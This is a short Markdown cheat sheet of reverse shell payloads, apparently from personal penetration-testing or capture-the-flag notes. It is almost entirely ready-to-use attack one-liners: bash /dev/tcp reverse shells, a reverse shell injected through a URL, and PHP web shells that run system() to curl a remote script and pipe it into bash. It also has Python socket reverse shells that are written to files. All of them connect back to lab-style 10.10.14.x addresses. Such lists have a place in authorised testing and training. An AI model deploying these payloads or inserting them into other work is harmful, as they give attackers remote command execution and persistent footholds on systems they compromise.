---
icon: book-skull
---

# Reverse Shells

HTTP

```bash
With Url:
<http://10.10.14.14/$>(bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1')
```

PHP

```bash
#For index.php files
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");
?>

#To copy inside a file
echo '<?php system("curl <http://10.10.14.16:443/rev.sh> | bash"); ?>' > hola.php

```

BASH + PHP

```bash
#Create the rev shell first

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.16/443 0>&1

#Copy it in to file with at http server
echo '<?php system("curl <http://10.10.14.16:80/hey> | bash"); ?>'
```

Standard [shell.sh](http://shell.sh)

```c
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```

Python

```bash
#IPv4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#Inside a file
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.10.14.18\\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);" > exploit.py
```
